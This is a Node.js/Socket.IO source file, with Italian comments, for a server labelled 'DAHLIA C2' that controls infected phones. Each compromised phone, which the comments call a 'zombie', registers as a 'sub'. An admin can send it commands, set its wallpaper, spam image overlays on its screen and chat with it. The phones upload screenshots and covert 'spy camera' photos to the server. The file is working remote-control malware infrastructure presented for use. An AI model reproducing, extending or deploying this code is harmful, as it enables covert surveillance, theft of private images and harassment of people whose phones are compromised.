const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
app.use(express.static(path.join(__dirname, 'public'))); // Serve React Dashboard from public dir

const server = http.createServer(app);
const io = new Server(server, {
  pingInterval: 10000,
  pingTimeout: 5000,
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

// Assicurati che esista la cartella uploads
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// Configurazione Multer per l'upload temporaneo di screenshot e foto spia
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'uploads/')
  },
  filename: function (req, file, cb) {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9)
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname))
  }
});
const upload = multer({ storage: storage });

// Stato dei client connessi in memoria
const connectedClients = new Map();

io.on('connection', (socket) => {
  console.log(`[+] New connection: ${socket.id}`);

  // Registrazione del tipo di client
  socket.on('register', (data) => {
    // data: { type: 'admin' | 'sub', subName?: string }
    socket.data = {
      type: data.type,
      subName: data.subName || 'Unknown',
      connectedAt: Date.now()
    };

    if (data.type === 'sub') {
      connectedClients.set(socket.id, socket.data);
      console.log(`[SUB] Registered: ${data.subName} (${socket.id})`);
      // Avvisa gli admin che un nuovo sub è online
      io.emit('clients_update', Array.from(connectedClients.entries()).map(([id, info]) => ({ id, ...info })));
    } else if (data.type === 'admin') {
      console.log(`[ADMIN] Registered: ${socket.id}`);
      // Invia la lista corrente all'admin appena connesso
      socket.emit('clients_update', Array.from(connectedClients.entries()).map(([id, info]) => ({ id, ...info })));
    }
  });

  // COMANDI DALL'ADMIN VERSO I SUB
  socket.on('admin_command', (data) => {
    // data: { targetId?: string, command: string, payload: any }
    console.log(`[CMD] ${data.command} -> ${data.targetId || 'ALL'}`);

    if (data.targetId) {
      // Comando a un sub specifico
      io.to(data.targetId).emit('sub_command', { command: data.command, payload: data.payload });
    } else {
      // Broadcast a tutti i sub (es. broadcast message)
      socket.broadcast.emit('sub_command', { command: data.command, payload: data.payload });
    }
  });

  // RISPOSTE DAI SUB E CHAT MESSAGES
  socket.on('sub_response', (data) => {
    console.log(`[RES] from ${socket.id}: ${data.type}`);
    // Inoltra tutte le risposte agli admin
    io.emit('admin_notification', {
      sourceId: socket.id,
      subName: socket.data.subName,
      ...data
    });
  });

  // GESTORE DEDICATO ALLA CHAT
  socket.on('chat_message', (data) => {
    // data: { targetId?: string, message: string, fromAdmin: boolean }
    console.log(`[CHAT] ${data.fromAdmin ? 'ADMIN' : 'SUB'} -> ${data.message.substring(0, 15)}...`);

    if (data.fromAdmin && data.targetId) {
      // Invia il messaggio di chat al sub specifico
      io.to(data.targetId).emit('chat_message', { message: data.message, fromAdmin: true });
    } else if (!data.fromAdmin) {
      // Un sub ha scritto, lo inoltriamo a tutti gli admin globalmente (con il suo ID e nome rintracciabili)
      io.emit('admin_chat_receive', {
        sourceId: socket.id,
        subName: socket.data.subName,
        message: data.message,
        timestamp: Date.now()
      });
    }
  });

  socket.on('disconnect', () => {
    console.log(`[-] Disconnected: ${socket.id}`);
    if (socket.data && socket.data.type === 'sub') {
      connectedClients.delete(socket.id);
      io.emit('clients_update', Array.from(connectedClients.entries()).map(([id, info]) => ({ id, ...info })));
    }
  });
});

// Endpoint per ricevere i file (Screenshot / Spy Camera) dai Sub o Immagini Custom dall'Admin
app.post('/api/upload', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).send('No file uploaded.');
  }
  const fileUrl = `/uploads/${req.file.filename}`;
  const subId = req.body.subId;
  const imageType = req.body.imageType || 'screenshot'; // screenshot, camera, wallpaper, overlay

  if (req.body.fromAdmin === 'true' && subId) {
    // Admin ha caricato un'immagine e vuole mandarla a un comando (wallpaper o overlay)
    console.log(`[Admin Upload] Sending ${imageType} to ${subId}`);

    // Ricostruiamo la BASE_URL dove risiede il server C2 pubblicamente
    const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
    const host = req.headers['x-forwarded-host'] || req.headers.host;
    const fullUrl = `${protocol}://${host}${fileUrl}`;

    if (imageType === 'wallpaper') {
      io.to(subId).emit('sub_command', { command: 'set_wallpaper', payload: { imageUrl: fullUrl } });
    } else if (imageType === 'overlay' || imageType === 'spam_overlay') {
      const timeoutMs = parseInt(req.body.timeoutMs || '0', 10);
      if (imageType === 'spam_overlay') {
        io.to(subId).emit('sub_command', { command: 'spam_overlay', payload: { url: fullUrl, count: 10 } });
      } else {
        io.to(subId).emit('sub_command', { command: 'TRIGGER_OVERLAY', payload: { url: fullUrl, timeoutMs } });
      }
    }
  } else {
    // Dati provenienti da un telefono zombie (Screenshot/Camera)
    io.emit('admin_notification', {
      type: 'new_image',
      sourceId: subId,
      imageType: imageType,
      url: fileUrl
    });
  }

  res.json({ success: true, url: fileUrl });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`[DAHLIA C2] Server listening on port ${PORT} (IPv4)`);
});
